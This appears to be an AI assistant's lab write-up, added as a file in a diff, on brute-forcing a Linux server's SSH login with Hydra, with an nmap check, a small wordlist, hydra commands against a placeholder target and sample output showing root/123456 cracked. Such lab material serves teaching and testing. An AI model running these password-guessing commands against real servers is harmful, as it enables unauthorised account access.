@@ -1,0 +1,96 @@
+Here's a complete write-up for your mobile forensics lab task on launching brute-force attacks on a Linux server using Hydra, structured as requested:
+
+
+---
+
+Lab Task: Brute-force Attack on Linux Server using Hydra
+
+1. Aim and Principle
+
+Aim:
+To perform a brute-force attack on a Linux server's SSH service using the Hydra tool in order to demonstrate password-guessing techniques used by attackers.
+
+Principle:
+Hydra is a fast and flexible network login cracker that supports numerous protocols, including SSH, FTP, HTTP, etc. A brute-force attack involves trying many combinations of usernames and passwords to gain unauthorized access. In this lab, Hydra will be used to attempt a login by cycling through combinations from a given wordlist until successful authentication is achieved.
+
+
+---
+
+2. Program and Procedure
+
+Requirements:
+
+Kali Linux (attacker machine)
+
+Linux server or VM with SSH enabled (target)
+
+Wordlists: Common username and password lists (e.g., /usr/share/wordlists/rockyou.txt)
+
+
+Procedure:
+
+1. Verify SSH is Running on the Target:
+
+nmap -p 22 <target_ip>
+
+
+2. Prepare Wordlists:
+
+Create or use existing wordlists for usernames and passwords:
+
+echo "root" > user.txt
+echo -e "123456\npassword\nadmin\nlinux" > pass.txt
+
+
+
+3. Run Hydra Command:
+
+To brute-force SSH login on the target:
+
+hydra -L user.txt -P pass.txt ssh://<target_ip>
+
+If the port is different (e.g., SSH on 2222):
+
+hydra -L user.txt -P pass.txt -s 2222 ssh://<target_ip>
+
+
+
+
+
+---
+
+3. Execution and Results
+
+Execution Steps:
+
+SSH is confirmed running on port 22 using nmap.
+
+Hydra is launched with specified username and password lists.
+
+The attack iterates through combinations.
+
+If credentials are valid, Hydra displays a successful login message.
+
+
+Observation: Hydra outputs the login combination as soon as a valid pair is found.
+
+
+---
+
+4. Output
+
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.
+
+[DATA] attacking ssh://192.168.1.100:22/
+[22][ssh] host: 192.168.1.100   login: root   password: 123456
+[STATUS] attack finished for 192.168.1.100 (valid login found)
+
+> ✅ Result: Valid credentials found — username: root, password: 123456.
+
+
+
+
+---
+
+Let me know if you'd like this written in a report or documentation format (e.g., PDF, DOCX) or extended with countermeasures and mitigation techniques.
+
